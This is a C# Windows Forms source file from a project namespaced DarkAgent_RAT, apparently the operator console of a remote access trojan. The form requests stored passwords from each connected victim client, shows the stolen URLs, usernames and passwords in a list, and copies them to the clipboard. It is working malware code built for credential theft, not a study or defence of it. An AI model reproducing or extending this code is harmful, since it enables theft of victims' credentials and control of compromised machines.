using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using DarkAgent_RAT.src.Events;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using DarkAgent_RAT.src.Utils;

namespace DarkAgent_RAT
{
    public partial class Passwords : Form
    {
        public Passwords()
        {
            InitializeComponent();
        }

        public List<int> ClientIDs;

        #region Speficic Events

        public void onProcessInfo(object o, PasswordEventArgs e)
        {
            string[] str = new string[3];
            str[0] = e.passwordInfo.URL;
            str[1] = e.passwordInfo.Username;
            str[2] = e.passwordInfo.Password;
            ListViewItem itm = new ListViewItem(str, 0);
            listView1.Items.Add(itm);
        }

        #endregion

        #region Form Events

        private void Passwords_Load(object sender, EventArgs e)
        {
            PasswordEvent.passwords += new GetPasswordHandler(onProcessInfo);

            for (int i = 0; i < ClientIDs.Count; i++)
            {
                try
                {
                    RatClientProcessor.Instance._clientList[ClientIDs[i]].SendPacket(new S_GetPasswords(RatClientProcessor.Instance._clientList[ClientIDs[i]]));
                }
                catch { }
            }
        }

        private void listView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            switch (e.Column)
            {
                case 0:
                    listView1.ListViewItemSorter = new ColumnSorter(0);
                    listView1.Sort();
                    break;
                case 1:
                    listView1.ListViewItemSorter = new ColumnSorter(1);
                    listView1.Sort();
                    break;
                case 2:
                    listView1.ListViewItemSorter = new ColumnSorter(2);
                    listView1.Sort();
                    break;
            }
        }

        private void copyToClipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClipboardBuilder cB = new ClipboardBuilder();
            for (int i = 0; i < listView1.SelectedItems.Count; i++)
            {
                cB.WriteLine("???: " + listView1.SelectedItems[i].SubItems[0].Text);
                cB.WriteLine("Username: " + listView1.SelectedItems[i].SubItems[1].Text);
                cB.WriteLine("Password: " + listView1.SelectedItems[i].SubItems[2].Text);
                cB.WriteLine("");
            }
            if (!cB.Finish())
                MessageBox.Show("Error while copying data!");
        }

        #endregion
    }
}